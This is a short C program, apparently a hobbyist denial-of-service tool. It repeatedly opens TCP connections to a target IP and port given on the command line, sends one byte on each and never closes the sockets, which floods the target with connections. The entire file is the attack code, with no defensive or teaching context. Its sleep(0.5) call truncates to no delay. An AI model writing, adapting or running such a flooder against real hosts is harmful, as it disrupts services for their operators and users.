#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/types.h>

#define h_addr h_addr_list[0]

void dos(const char * ip, int port) {
  int sockfd = 0, 
  sent_recv_bytes = 0;
  int addr_len = 0;
  addr_len = sizeof(struct sockaddr);
  struct sockaddr_in dest;
  dest.sin_family = AF_INET;
  dest.sin_port = htons(port);
  struct hostent *host = (struct hostent *)gethostbyname(ip);
  dest.sin_addr = *((struct in_addr *)host->h_addr);
  printf("Start of the DoS %s:%d\n", ip, port);
  int i = 0;
  while(1)
  {
    char petition = 1;
    sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(connect(sockfd, (struct sockaddr *)&dest, sizeof(struct sockaddr)))
    {
      printf("Cannot connect\n");
      return;
    }
    send(sockfd, (char *)&petition, sizeof(petition), 0);
    printf("%d iteration of DoS\n", ++i);
    sleep(0.5);
  } 
}

int main(int argc, char **argv){
  if (argc < 3)
  {
    printf("usage: %s $ip $port\n", argv[0]);
    return 0;
  }
  dos(argv[1], atoi(argv[2]));
  
  return 0;
}
